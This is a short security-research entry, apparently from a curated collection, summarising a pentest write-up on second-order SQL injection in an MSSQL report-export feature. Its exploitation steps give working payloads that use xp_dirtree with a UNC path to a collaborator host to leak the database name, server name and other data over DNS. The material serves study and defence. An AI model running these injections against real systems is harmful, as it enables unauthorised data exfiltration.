# Second-order MSSQL SQLi: stored report param fires later, exfiltrated OOB via xp_dirtree DNS

- **Vuln type / sub-variant:** second-order (stored) SQLi exploited out-of-band via DNS; MSSQL
- **Target type:** an Excel report-export feature; a date `Value` inside stored `ReportParams` JSON is reused in a later API call's query
- **Recon signal:** input stored in one request and consumed by a later request; a `WAITFOR` delay (500 then 200 after 20s) confirms MSSQL and that the stored value reaches SQL
- **Root cause:** the stored `Value` is incorporated into a query in a later context without sanitization (deemed trusted because it came from the DB)
- **Exploitation steps:**
  1. Confirm second-order + DBMS with a time delay in the stored `Value`.
  2. OOB trigger: inject `Value` = `...'; DECLARE @q VARCHAR(99); SET @q='\\collab.domain\path'; EXEC master.dbo.xp_dirtree @q;-- ` so the SQL server resolves a UNC path -> DNS lookup to your collaborator (Interactsh automated capture).
  3. Exfiltrate in the subdomain: `SELECT @q = DB_NAME()` (or `@@SERVERNAME`), build `@cmd = '\\' + @q + '.collab.domain\path'`, `EXEC xp_dirtree @cmd`; iterate over tables/columns/users.
- **Bypasses used:** `xp_dirtree` UNC path for DNS egress (single-step, avoids slow time-based loops); challenges were char limits and special-char handling
- **Impact:** disclose DB name, server name, usernames, tables, service account via DNS
- **Bounty:** not stated (pentest)
- **Lesson / pattern:** second-order SQLi hides because the stored value fires in a later, different context; inject stored fields (report params, preferences) then find the endpoint that reuses them. OOB via `xp_dirtree` (UNC -> DNS) turns a blind/async injection into direct exfiltration; DNS egress is usually allowed, and `WAITFOR`/`xp_dirtree` double as MSSQL fingerprints.
- **Source:**
  - Title: Exploiting Second Order SQL Injection with Stored Procedures (DNS-based egress)
  - Author: Deepak Dhasmana (NetSPI)
  - URL: https://www.netspi.com/blog/technical-blog/web-application-pentesting/second-order-sql-injection-with-stored-procedures-dns-based-egress/
  - Date: 2024-12 (scraped 2026-11-19)
  - Raw file: `sources/sqli/21-netspi-second-order-sqli-oob-dns.md`

Tags: second-order, oob-oast, mssql, xp-dirtree, dns-exfiltration, stacked-queries, interactsh, dbms-fingerprint, source-real
